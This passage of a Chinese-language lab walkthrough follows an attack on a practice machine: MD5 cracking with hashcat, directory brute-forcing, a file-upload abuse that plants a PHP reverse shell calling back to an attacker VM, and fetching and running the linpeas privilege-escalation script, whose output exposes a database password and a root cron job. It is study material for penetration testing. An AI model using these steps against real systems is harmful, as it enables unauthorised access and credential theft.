class="line"></span><br><span class="line">**cd73502828457d15655bbd7a63fb0bc8:student**                  </span><br><span class="line">                                                          </span><br><span class="line">Session..........: hashcat</span><br><span class="line">Status...........: Cracked</span><br><span class="line">Hash.Mode........: 0 (MD5)</span><br><span class="line">Hash.Target......: cd73502828457d15655bbd7a63fb0bc8</span><br><span class="line">Time.Started.....: Thu Feb 15 12:34:06 2024 (0 secs)</span><br><span class="line">Time.Estimated...: Thu Feb 15 12:34:06 2024 (0 secs)</span><br><span class="line">Kernel.Feature...: Pure Kernel</span><br><span class="line">Guess.Base.......: File (/usr/share/wordlists/rockyou.txt)</span><br><span class="line">Guess.Queue......: 1/1 (100.00%)</span><br><span class="line">Speed.#1.........:    71479 H/s (0.47ms) @ Accel:1024 Loops:1 Thr:1 Vec:8</span><br><span class="line">Recovered........: 1/1 (100.00%) Digests (total), 1/1 (100.00%) Digests (new)</span><br><span class="line">Progress.........: 4096/14344385 (0.03%)</span><br><span class="line">Rejected.........: 0/4096 (0.00%)</span><br><span class="line">Restore.Point....: 0/14344385 (0.00%)</span><br><span class="line">Restore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:0-1</span><br><span class="line">Candidate.Engine.: Device Generator</span><br><span class="line">Candidates.#1....: 123456 -&gt; oooooo</span><br><span class="line">Hardware.Mon.#1..: Util: 25%</span><br><span class="line"></span><br><span class="line">Started: Thu Feb 15 12:33:24 2024</span><br><span class="line">Stopped: Thu Feb 15 12:34:08 2024</span><br></pre></td></tr></table></figure>
<ul>
<li>爆破出的密碼是<strong>student</strong>，但我們不知道要在哪裡進行登入</li>
<li>所以需要進行目錄爆破尋找登入介面</li>
</ul>
  <figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">┌──(root㉿kali)-[~]</span><br><span class="line">└─# dirb http://192.168.19.141 <span class="comment">#嘗試所有可能，尋找目錄，會把所有成功、失敗的找尋過程都列出來</span></span><br><span class="line"></span><br><span class="line">-----------------</span><br><span class="line">DIRB v2.22    </span><br><span class="line">By The Dark Raver</span><br><span class="line">-----------------</span><br><span class="line"></span><br><span class="line">START_TIME: Thu Feb 15 12:39:04 2024</span><br><span class="line">URL_BASE: http://192.168.19.141/</span><br><span class="line">WORDLIST_FILES: /usr/share/dirb/wordlists/common.txt</span><br><span class="line"></span><br><span class="line">-----------------</span><br><span class="line"></span><br><span class="line">GENERATED WORDS: 4612                                                          </span><br><span class="line"></span><br><span class="line">---- Scanning URL: http://192.168.19.141/ ----</span><br><span class="line">+ http://192.168.19.141/index.html (CODE:200|SIZE:10701)</span><br><span class="line">....</span><br><span class="line"></span><br><span class="line">┌──(root㉿kali)-[~]</span><br><span class="line">└─# ***apt install ffuf***</span><br><span class="line"></span><br><span class="line">┌──(root㉿kali)-[~]</span><br><span class="line">└─# **ffuf -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt:FUZZ -u http://192.168.19.141/FUZZ**</span><br><span class="line"><span class="comment"># 只列出找到的</span></span><br><span class="line">        /<span class="string">&#x27;___\  /&#x27;</span>___\           /<span class="string">&#x27;___\       </span></span><br><span class="line"><span class="string">       /\ \__/ /\ \__/  __  __  /\ \__/       </span></span><br><span class="line"><span class="string">       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      </span></span><br><span class="line"><span class="string">        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      </span></span><br><span class="line"><span class="string">         \ \_\   \ \_\  \ \____/  \ \_\       </span></span><br><span class="line"><span class="string">          \/_/    \/_/   \/___/    \/_/       </span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">       v2.1.0-dev</span></span><br><span class="line"><span class="string">________________________________________________</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"> :: Method           : GET</span></span><br><span class="line"><span class="string"> :: URL              : http://192.168.19.141/FUZZ</span></span><br><span class="line"><span class="string"> :: Wordlist         : FUZZ: /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt</span></span><br><span class="line"><span class="string"> :: Follow redirects : false</span></span><br><span class="line"><span class="string"> :: Calibration      : false</span></span><br><span class="line"><span class="string"> :: Timeout          : 10</span></span><br><span class="line"><span class="string"> :: Threads          : 40</span></span><br><span class="line"><span class="string"> :: Matcher          : Response status: **200-299,301,302,307,401,403,405,500**</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"># This work is licensed under the Creative Commons  [Status: 200, Size: 10701, Words: 3427, Lines: 369, Duration: 4ms]</span></span><br><span class="line"><span class="string"># Copyright 2007 James Fisher [Status: 200, Size: 10701, Words: 3427, Lines: 369, Duration: 3ms]</span></span><br><span class="line"><span class="string"># directory-list-2.3-medium.txt [Status: 200, Size: 10701, Words: 3427, Lines: 369, Duration: 6ms]</span></span><br><span class="line"><span class="string"># Attribution-Share Alike 3.0 License. To view a copy of this  [Status: 200, Size: 10701, Words: 3427, Lines: 369, Duration: 4ms]</span></span><br><span class="line"><span class="string">#                       [Status: 200, Size: 10701, Words: 3427, Lines: 369, Duration: 4ms]</span></span><br><span class="line"><span class="string"># on atleast 2 different hosts [Status: 200, Size: 10701, Words: 3427, Lines: 369, Duration: 7ms]</span></span><br><span class="line"><span class="string">#                       [Status: 200, Size: 10701, Words: 3427, Lines: 369, Duration: 4ms]</span></span><br><span class="line"><span class="string">                        [Status: 200, Size: 10701, Words: 3427, Lines: 369, Duration: 5ms]</span></span><br><span class="line"><span class="string"># Priority ordered case sensative list, where entries were found  [Status: 200, Size: 10701, Words: 3427, Lines: 369, Duration: 318ms]</span></span><br><span class="line"><span class="string">#                       [Status: 200, Size: 10701, Words: 3427, Lines: 369, Duration: 667ms]</span></span><br><span class="line"><span class="string"># or send a letter to Creative Commons, 171 Second Street,  [Status: 200, Size: 10701, Words: 3427, Lines: 369, Duration: 1268ms]</span></span><br><span class="line"><span class="string">#                       [Status: 200, Size: 10701, Words: 3427, Lines: 369, Duration: 1310ms]</span></span><br><span class="line"><span class="string"># Suite 300, San Francisco, California, 94105, USA. [Status: 200, Size: 10701, Words: 3427, Lines: 369, Duration: 1523ms]</span></span><br><span class="line"><span class="string"># license, visit http://creativecommons.org/licenses/by-sa/3.0/  [Status: 200, Size: 10701, Words: 3427, Lines: 369, Duration: 1572ms]</span></span><br><span class="line"><span class="string">**academy                 [Status: 301, Size: 318, Words: 20, Lines: 10, Duration: 3ms]</span></span><br><span class="line"><span class="string">phpmyadmin              [Status: 301, Size: 321, Words: 20, Lines: 10, Duration: 4ms]**</span></span><br><span class="line"><span class="string">                        [Status: 200, Size: 10701, Words: 3427, Lines: 369, Duration: 147ms]</span></span><br><span class="line"><span class="string">server-status           [Status: 403, Size: 279, Words: 20, Lines: 10, Duration: 9ms]</span></span><br><span class="line"><span class="string">:: Progress: [220560/220560] :: Job [1/1] :: 4347 req/sec :: Duration: [0:00:52] :: Errors: 0 ::</span></span><br></pre></td></tr></table></figure>
<ul>
<li><p><strong>academy、phpmyadmin</strong></p>
</li>
<li><p>找到登陸目錄了，將剛找到了登入資訊輸入</p>
<p>  <img src="/img/privilege_Untitled_5.png" alt="Untitled"></p>
</li>
<li><p>登入後會看到該用戶訊息，也可以去看看網頁源碼也許有時那邊會有敏感消息沒被刪除</p>
<p>  <img src="/img/privilege_Untitled_6.png" alt="Untitled"></p>
</li>
<li><p>接下來找尋該網頁可以利用的地方，my-profile頁面發現一個可以進行上傳檔案功能的，也許有機會進行利用</p>
</li>
</ul>
<p>  <img src="/img/privilege_Untitled_7.png" alt="Untitled"></p>
<p>  <img src="/img/privilege_Untitled_8.png" alt="Untitled"></p>
<ul>
<li><p>並且開啟圖片，可以注意到它存在某個目錄下</p>
<p>  <img src="/img/privilege_Untitled_9.png" alt="Untitled"></p>
</li>
<li><p>也許可以上傳reverse shell，網頁由php撰寫</p>
</li>
<li><p><a target="_blank" rel="noopener" href="https://github.com/pentestmonkey/php-reverse-shell/blob/master/php-reverse-shell.php">https://github.com/pentestmonkey/php-reverse-shell/blob/master/php-reverse-shell.php</a></p>
  <figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">set_time_limit (0);</span><br><span class="line"><span class="variable">$VERSION</span> = <span class="string">&quot;1.0&quot;</span>;</span><br><span class="line">**<span class="variable">$ip</span> = <span class="string">&#x27;192.168.19.130&#x27;</span>;  // attack vm</span><br><span class="line"><span class="variable">$port</span> = 4444;       // attack vm nc**</span><br><span class="line"><span class="variable">$chunk_size</span> = 1400;</span><br><span class="line"><span class="variable">$write_a</span> = null;</span><br><span class="line"><span class="variable">$error_a</span> = null;</span><br><span class="line"><span class="variable">$shell</span> = <span class="string">&#x27;uname -a; w; id; /bin/sh -i&#x27;</span>;</span><br><span class="line"><span class="variable">$daemon</span> = 0;</span><br><span class="line"><span class="variable">$debug</span> = 0;</span><br><span class="line">....</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
</li>
<li><p>可以對這些資訊進行修改，並將內容寫到shell.php中</p>
</li>
<li><p>先nc偵聽port，port是shell.php寫的，再將shell.php上傳到網頁中</p>
</li>
</ul>
<p>  <img src="/img/privilege_Untitled_10.png" alt="Untitled"></p>
  <figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">┌──(root㉿kali)-[~]</span><br><span class="line">└─# **nc -nlvp 4444**                             </span><br><span class="line">listening on [any] 4444 ...</span><br><span class="line">connect to [192.168.19.130] from (UNKNOWN) [192.168.19.141] 34072</span><br><span class="line">Linux academy 4.19.0-16-amd64 <span class="comment">#1 SMP Debian 4.19.181-1 (2021-03-19) x86_64 GNU/Linux</span></span><br><span class="line"> 13:44:39 up  2:29,  1 user,  load average: 0.00, 0.00, 0.08</span><br><span class="line">USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT</span><br><span class="line">root     tty1     -                11:16    2:23m  0.02s  0.01s -bash</span><br><span class="line">uid=33(www-data) gid=33(www-data) <span class="built_in">groups</span>=33(www-data)</span><br><span class="line">/bin/sh: 0: can<span class="string">&#x27;t access tty; job control turned off</span></span><br><span class="line"><span class="string">$ whoami</span></span><br><span class="line"><span class="string">www-data</span></span><br><span class="line"><span class="string">$ sudo -l</span></span><br><span class="line"><span class="string">/bin/sh: 2: sudo: not found</span></span><br><span class="line"><span class="string">$ locate sudo</span></span><br><span class="line"><span class="string">/bin/sh: 3: locate: not found</span></span><br></pre></td></tr></table></figure>
<p>  可惜的是，我們並不是root最高權限的身分，需要進行提權</p>
<p>  <a target="_blank" rel="noopener" href="https://github.com/carlospolop/PEASS-ng/tree/master/linPEAS">https://github.com/carlospolop/PEASS-ng/tree/master/linPEAS</a></p>
  <figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">┌──(root㉿kali)-[~kali/Desktop/testscript]</span><br><span class="line">└─# **curl -L** https://github.com/carlospolop/PEASS-ng/releases/latest/download/**linpeas.sh | sh**</span><br><span class="line">  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current</span><br><span class="line">                                 Dload  Upload   Total   Spent    Left  Speed</span><br><span class="line">  0     0    0     0    0     0      0      0 --:--:-- --:--:-- --:--:--     0</span><br><span class="line">...</span><br></pre></td></tr></table></figure>
<ul>
<li>前面成功利用上傳漏洞RCE到了目標機器，但不是最高權限，現在attack vm 的linpeas.sh的目錄開一個server，我們需要將這個提權腳本上傳到目標機器上，並賦予執行權限</li>
</ul>
  <figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">┌──(root㉿kali)-[~kali/Desktop/testscript/trans]</span><br><span class="line">└─# <span class="built_in">ls</span></span><br><span class="line">linpeas.sh</span><br><span class="line"></span><br><span class="line">┌──(root㉿kali)-[~kali/Desktop/testscript/trans]</span><br><span class="line">└─# **python3 -m http.server 80**                                            </span><br><span class="line">Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...</span><br></pre></td></tr></table></figure>
  <figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">┌──(root㉿kali)-[~]</span><br><span class="line">└─# **nc -nlvp 4444**                             </span><br><span class="line">listening on [any] 4444 ...</span><br><span class="line">connect to [192.168.19.130] from (UNKNOWN) [192.168.19.141] 34072</span><br><span class="line">Linux academy 4.19.0-16-amd64 <span class="comment">#1 SMP Debian 4.19.181-1 (2021-03-19) x86_64 GNU/Linux</span></span><br><span class="line"> 13:44:39 up  2:29,  1 user,  load average: 0.00, 0.00, 0.08</span><br><span class="line">USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT</span><br><span class="line">root     tty1     -                11:16    2:23m  0.02s  0.01s -bash</span><br><span class="line">uid=33(www-data) gid=33(www-data) <span class="built_in">groups</span>=33(www-data)</span><br><span class="line">/bin/sh: 0: can<span class="string">&#x27;t access tty; job control turned off</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">$ cd /tmp       </span></span><br><span class="line"><span class="string">$ pwd</span></span><br><span class="line"><span class="string">/tmp</span></span><br><span class="line"><span class="string">$ **wget http://192.168.19.130/linpeas.sh #填入我們開伺服器(attack vm)的IP**</span></span><br><span class="line"><span class="string">--2024-02-15 14:07:43--  http://192.168.19.130/linpeas.sh</span></span><br><span class="line"><span class="string">Connecting to 192.168.19.130:80... connected.</span></span><br><span class="line"><span class="string">HTTP request sent, awaiting response... 200 OK</span></span><br><span class="line"><span class="string">Length: 853290 (833K) [text/x-sh]</span></span><br><span class="line"><span class="string">Saving to: &#x27;</span>linpeas.sh<span class="string">&#x27;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">     0K .......... .......... .......... .......... ..........  6% 7.45M 0s</span></span><br><span class="line"><span class="string">    50K .......... .......... .......... .......... .......... 12% 8.95M 0s</span></span><br><span class="line"><span class="string">   100K .......... .......... .......... .......... .......... 18% 30.6M 0s</span></span><br><span class="line"><span class="string">   150K .......... .......... .......... .......... .......... 24% 23.9M 0s</span></span><br><span class="line"><span class="string">   200K .......... .......... .......... .......... .......... 30% 25.1M 0s</span></span><br><span class="line"><span class="string">   250K .......... .......... .......... .......... .......... 36% 20.1M 0s</span></span><br><span class="line"><span class="string">   300K .......... .......... .......... .......... .......... 42% 44.6M 0s</span></span><br><span class="line"><span class="string">   350K .......... .......... .......... .......... .......... 48% 92.5M 0s</span></span><br><span class="line"><span class="string">   400K .......... .......... .......... .......... .......... 54% 64.9M 0s</span></span><br><span class="line"><span class="string">   450K .......... .......... .......... .......... .......... 60% 11.7M 0s</span></span><br><span class="line"><span class="string">   500K .......... .......... .......... .......... .......... 66% 6.96M 0s</span></span><br><span class="line"><span class="string">   550K .......... .......... .......... .......... .......... 72% 20.9M 0s</span></span><br><span class="line"><span class="string">   600K .......... .......... .......... .......... .......... 78% 32.4M 0s</span></span><br><span class="line"><span class="string">   650K .......... .......... .......... .......... .......... 84%  190M 0s</span></span><br><span class="line"><span class="string">   700K .......... .......... .......... .......... .......... 90%  198M 0s</span></span><br><span class="line"><span class="string">   750K .......... .......... .......... .......... .......... 96%  262M 0s</span></span><br><span class="line"><span class="string">   800K .......... .......... .......... ...                  100% 18.4M=0.04s</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">2024-02-15 14:07:43 (20.4 MB/s) - &#x27;</span>linpeas.sh<span class="string">&#x27; saved [853290/853290]</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">$ ls</span></span><br><span class="line"><span class="string">linpeas.sh</span></span><br><span class="line"><span class="string">$ chmod +x linpeas.sh</span></span><br><span class="line"><span class="string"></span></span><br></pre></td></tr></table></figure>
<p>  先來看看linpeas.sh執行了什麼</p>
  <figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ ./linpeas.sh</span><br><span class="line"></span><br><span class="line">...</span><br><span class="line">LEGEND:                                                                                                                      </span><br><span class="line">  RED/YELLOW: 95% a PE vector  <span class="comment">#可以專注在查看RED</span></span><br><span class="line">  RED: You should take a look to it</span><br><span class="line">  LightCyan: Users with console</span><br><span class="line">  Blue: Users without console &amp; mounted devs</span><br><span class="line">  Green: Common things (<span class="built_in">users</span>, <span class="built_in">groups</span>, SUID/SGID, mounts, .sh scripts, cronjobs) </span><br><span class="line">  LightMagenta: Your username</span><br><span class="line">...</span><br><span class="line"></span><br><span class="line">╔════════════════════╗</span><br><span class="line">══════════════════════════════╣ System Information ╠══════════════════════════════                                            </span><br><span class="line">                              ╚════════════════════╝                                                                          </span><br><span class="line">╔══════════╣ Operative system</span><br><span class="line">╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#kernel-exploits                                            </span><br><span class="line">Linux version 4.19.0-16-amd64 (debian-kernel@lists.debian.org) (gcc version 8.3.0 (Debian 8.3.0-6)) <span class="comment">#1 SMP Debian 4.19.181-1 (2021-03-19)</span></span><br><span class="line">Distributor ID: Debian</span><br><span class="line">Description:    Debian GNU/Linux 10 (buster)</span><br><span class="line">Release:        10</span><br><span class="line">Codename:       buster</span><br><span class="line"></span><br><span class="line">...</span><br><span class="line"></span><br><span class="line">╔══════════╣ Cron <span class="built_in">jobs</span></span><br><span class="line">╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#scheduled-cron-jobs                                        </span><br><span class="line">/usr/bin/crontab                                                                                                              </span><br><span class="line">incrontab Not Found</span><br><span class="line">-rw-r--r-- 1 root root    1077 Jun 16  2021 /etc/crontab                                                                      </span><br><span class="line"></span><br><span class="line">/etc/cron.d:</span><br><span class="line">total 16</span><br><span class="line">drwxr-xr-x  2 root root 4096 May 29  2021 .</span><br><span class="line">drwxr-xr-x 74 root root 4096 Feb 15 14:08 ..</span><br><span class="line">-rw-r--r--  1 root root  102 Oct 11  2019 .placeholder</span><br><span class="line">-rw-r--r--  1 root root  712 Dec 17  2018 php</span><br><span class="line"></span><br><span class="line">/etc/cron.daily:</span><br><span class="line">total 40</span><br><span class="line">drwxr-xr-x  2 root root 4096 May 29  2021 .</span><br><span class="line">drwxr-xr-x 74 root root 4096 Feb 15 14:08 ..</span><br><span class="line">-rw-r--r--  1 root root  102 Oct 11  2019 .placeholder</span><br><span class="line">-rwxr-xr-x  1 root root  539 Aug  8  2020 apache2</span><br><span class="line">-rwxr-xr-x  1 root root 1478 May 12  2020 apt-compat</span><br><span class="line">-rwxr-xr-x  1 root root  355 Dec 29  2017 bsdmainutils</span><br><span class="line">-rwxr-xr-x  1 root root 1187 Apr 18  2019 dpkg</span><br><span class="line">-rwxr-xr-x  1 root root  377 Aug 28  2018 logrotate</span><br><span class="line">-rwxr-xr-x  1 root root 1123 Feb 10  2019 man-db</span><br><span class="line">-rwxr-xr-x  1 root root  249 Sep 27  2017 passwd</span><br><span class="line"></span><br><span class="line">/etc/cron.hourly:</span><br><span class="line">total 12</span><br><span class="line">drwxr-xr-x  2 root root 4096 May 29  2021 .</span><br><span class="line">drwxr-xr-x 74 root root 4096 Feb 15 14:08 ..</span><br><span class="line">-rw-r--r--  1 root root  102 Oct 11  2019 .placeholder</span><br><span class="line"></span><br><span class="line">/etc/cron.monthly:</span><br><span class="line">total 12</span><br><span class="line">drwxr-xr-x  2 root root 4096 May 29  2021 .</span><br><span class="line">drwxr-xr-x 74 root root 4096 Feb 15 14:08 ..</span><br><span class="line">-rw-r--r--  1 root root  102 Oct 11  2019 .placeholder</span><br><span class="line"></span><br><span class="line">/etc/cron.weekly:</span><br><span class="line">total 16</span><br><span class="line">drwxr-xr-x  2 root root 4096 May 29  2021 .</span><br><span class="line">drwxr-xr-x 74 root root 4096 Feb 15 14:08 ..</span><br><span class="line">-rw-r--r--  1 root root  102 Oct 11  2019 .placeholder</span><br><span class="line">-rwxr-xr-x  1 root root  813 Feb 10  2019 man-db</span><br><span class="line"></span><br><span class="line">SHELL=/bin/sh</span><br><span class="line">PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin</span><br><span class="line">...</span><br><span class="line">* * * * * /home/grimmie/backup.sh</span><br><span class="line"></span><br><span class="line">....</span><br><span class="line"></span><br><span class="line">╔══════════╣ Searching passwords <span class="keyword">in</span> config PHP files</span><br><span class="line">/usr/share/phpmyadmin/config.inc.php:<span class="variable">$cfg</span>[<span class="string">&#x27;Servers&#x27;</span>][<span class="variable">$i</span>][<span class="string">&#x27;AllowNoPassword&#x27;</span>] = <span class="literal">false</span>;                                          </span><br><span class="line">/usr/share/phpmyadmin/config.sample.inc.php:<span class="variable">$cfg</span>[<span class="string">&#x27;Servers&#x27;</span>][<span class="variable">$i</span>][<span class="string">&#x27;AllowNoPassword&#x27;</span>] = <span class="literal">false</span>;</span><br><span class="line">/usr/share/phpmyadmin/libraries/config.default.php:<span class="variable">$cfg</span>[<span class="string">&#x27;Servers&#x27;</span>][<span class="variable">$i</span>][<span class="string">&#x27;AllowNoPassword&#x27;</span>] = <span class="literal">false</span>;</span><br><span class="line">/usr/share/phpmyadmin/libraries/config.default.php:<span class="variable">$cfg</span>[<span class="string">&#x27;ShowChgPassword&#x27;</span>] = <span class="literal">true</span>;</span><br><span class="line">**/var/www/html/academy/admin/includes/config.php:<span class="variable">$mysql_password</span> = <span class="string">&quot;My_V3ryS3cur3_P4ss&quot;</span>;</span><br><span class="line">/var/www/html/academy/includes/config.php:<span class="variable">$mysql_password</span> = <span class="string">&quot;My_V3ryS3cur3_P4ss&quot;</span>;**</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<ul>
<li><p>完整輸出</p>
  <figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ ./linpeas.sh</span><br><span class="line"></span><br><span class="line">                            ▄▄▄▄▄▄▄▄▄▄▄▄▄▄</span><br><span class="line">                    ▄▄▄▄▄▄▄             ▄▄▄▄▄▄▄▄</span><br><span class="line">             ▄▄▄▄▄▄▄      ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄  ▄▄▄▄</span><br><span class="line">         ▄▄▄▄     ▄ ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄ ▄▄▄▄▄▄</span><br><span class="line">         ▄    ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄</span><br><span class="line">         ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄ ▄▄▄▄▄       ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄</span><br><span class="line">         ▄▄▄▄▄▄▄▄▄▄▄          ▄▄▄▄▄▄               ▄▄▄▄▄▄ ▄</span><br><span class="line">         ▄▄▄▄▄▄              ▄▄▄▄▄▄▄▄                 ▄▄▄▄ </span><br><span class="line">         ▄▄                  ▄▄▄ ▄▄▄▄▄                  ▄▄▄</span><br><span class="line">         ▄▄                ▄▄▄▄▄▄▄▄▄▄▄▄                  ▄▄</span><br><span class="line">         ▄            ▄▄ ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄   ▄▄</span><br><span class="line">         ▄      ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄</span><br><span class="line">         ▄▄▄▄▄▄▄▄▄▄▄▄▄▄                                ▄▄▄▄</span><br><span class="line">         ▄▄▄▄▄  ▄▄▄▄▄                       ▄▄▄▄▄▄     ▄▄▄▄</span><br><span class="line">         ▄▄▄▄   ▄▄▄▄▄                       ▄▄▄▄▄      ▄ ▄▄</span><br><span class="line">         ▄▄▄▄▄  ▄▄▄▄▄        ▄▄▄▄▄▄▄        ▄▄▄▄▄     ▄▄▄▄▄</span><br><span class="line">         ▄▄▄▄▄▄  ▄▄▄▄▄▄▄      ▄▄▄▄▄▄▄      ▄▄▄▄▄▄▄   ▄▄▄▄▄ </span><br><span class="line">          ▄▄▄▄▄▄▄▄▄▄▄▄▄▄        ▄          ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄ </span><br><span class="line">         ▄▄▄▄▄▄▄▄▄▄▄▄▄                       ▄▄▄▄▄▄▄▄▄▄▄▄▄▄</span><br><span class="line">         ▄▄▄▄▄▄▄▄▄▄▄                         ▄▄▄▄▄▄▄▄▄▄▄▄▄▄</span><br><span class="line">         ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄            ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄</span><br><span class="line">          ▀▀▄▄▄   ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄ ▄▄▄▄▄▄▄▀▀▀▀▀▀</span><br><span class="line">               ▀▀▀▄▄▄▄▄      ▄▄▄▄▄▄▄▄▄▄  ▄▄▄▄▄▄▀▀</span><br><span class="line">                     ▀▀▀▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▀▀▀</span><br><span class="line"></span><br><span class="line">    /---------------------------------------------------------------------------------\</span><br><span class="line">    |                             Do you like PEASS?                                  |                                       </span><br><span class="line">    |---------------------------------------------------------------------------------|                                       </span><br><span class="line">    |         Get the latest version    :     https://github.com/sponsors/carlospolop |                                       </span><br><span class="line">    |         Follow on Twitter         :     @hacktricks_live                        |                                       </span><br><span class="line">    |         Respect on HTB            :     SirBroccoli                             |                                       </span><br><span class="line">    |---------------------------------------------------------------------------------|                                       </span><br><span class="line">    |                                 Thank you!                                      |                                       </span><br><span class="line">    \---------------------------------------------------------------------------------/                                       </span><br><span class="line">          linpeas-ng by carlospolop                                                                                           </span><br><span class="line">                                                                                                                              </span><br><span class="line">ADVISORY: This script should be used <span class="keyword">for</span> authorized penetration testing and/or educational purposes only. Any misuse of this software will not be the responsibility of the author or of any other collaborator. Use it at your own computers and/or with the computer owner<span class="string">&#x27;s permission.                                                                                                </span></span><br><span class="line"><span class="string">                                                                                                                              </span></span><br><span class="line"><span class="string">Linux Privesc Checklist: https://book.hacktricks.xyz/linux-hardening/linux-privilege-escalation-checklist</span></span><br><span class="line"><span class="string"> LEGEND:                                                                                                                      </span></span><br><span class="line"><span class="string">  RED/YELLOW: 95% a PE vector</span></span><br><span class="line"><span class="string">  RED: You should take a look to it</span></span><br><span class="line"><span class="string">  LightCyan: Users with console</span></span><br><span class="line"><span class="string">  Blue: Users without console &amp; mounted devs</span></span><br><span class="line"><span class="string">  Green: Common things (users, groups, SUID/SGID, mounts, .sh scripts, cronjobs) </span></span><br><span class="line"><span class="string">  LightMagenta: Your username</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"> Starting linpeas. Caching Writable Folders...</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">                               ╔═══════════════════╗</span></span><br><span class="line"><span class="string">═══════════════════════════════╣ Basic information ╠═══════════════════════════════                                           </span></span><br><span class="line"><span class="string">                               ╚═══════════════════╝                                                                          </span></span><br><span class="line"><span class="string">OS: Linux version 4.19.0-16-amd64 (debian-kernel@lists.debian.org) (gcc version 8.3.0 (Debian 8.3.0-6)) #1 SMP Debian 4.19.181-1 (2021-03-19)</span></span><br><span class="line"><span class="string">User &amp; Groups: uid=33(www-data) gid=33(www-data) groups=33(www-data)</span></span><br><span class="line"><span class="string">Hostname: academy</span></span><br><span class="line"><span class="string">Writable folder: /dev/shm</span></span><br><span class="line"><span class="string">[+] /usr/bin/ping is available for network discovery (linpeas can discover hosts, learn more with -h)</span></span><br><span class="line"><span class="string">[+] /usr/bin/bash is available for network discovery, port scanning and port forwarding (linpeas can discover hosts, scan ports, and forward ports. Learn more with -h)                                                                                     </span></span><br><span class="line"><span class="string">[+] /usr/bin/nc is available for network discovery &amp; port scanning (linpeas can discover hosts and scan ports, learn more with -h)                                                                                                                          </span></span><br><span class="line"><span class="string">                                                                                                                              </span></span><br><span class="line"><span class="string">                                                                                                                              </span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">Caching directories . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . uniq: write error: Broken pipe</span></span><br><span class="line"><span class="string">DONE</span></span><br><span class="line"><span class="string">                                                                                                                              </span></span><br><span class="line"><span class="string">                              ╔════════════════════╗</span></span><br><span class="line"><span class="string">══════════════════════════════╣ System Information ╠══════════════════════════════                                            </span></span><br><span class="line"><span class="string">                              ╚════════════════════╝                                                                          </span></span><br><span class="line"><span class="string">╔══════════╣ Operative system</span></span><br><span class="line"><span class="string">╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#kernel-exploits                                            </span></span><br><span class="line"><span class="string">Linux version 4.19.0-16-amd64 (debian-kernel@lists.debian.org) (gcc version 8.3.0 (Debian 8.3.0-6)) #1 SMP Debian 4.19.181-1 (2021-03-19)</span></span><br><span class="line"><span class="string">Distributor ID: Debian</span></span><br><span class="line"><span class="string">Description:    Debian GNU/Linux 10 (buster)</span></span><br><span class="line"><span class="string">Release:        10</span></span><br><span class="line"><span class="string">Codename:       buster</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">╔══════════╣ Sudo version</span></span><br><span class="line"><span class="string">sudo Not Found                                                                                                                </span></span><br><span class="line"><span class="string">                                                                                                                              </span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">╔══════════╣ PATH</span></span><br><span class="line"><span class="string">╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#writable-path-abuses                                       </span></span><br><span class="line"><span class="string">/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin                                                                  </span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">╔══════════╣ Date &amp; uptime</span></span><br><span class="line"><span class="string">Thu Feb 15 14:16:19 EST 2024                                                                                                  </span></span><br><span class="line"><span class="string"> 14:16:19 up  3:01,  1 user,  load average: 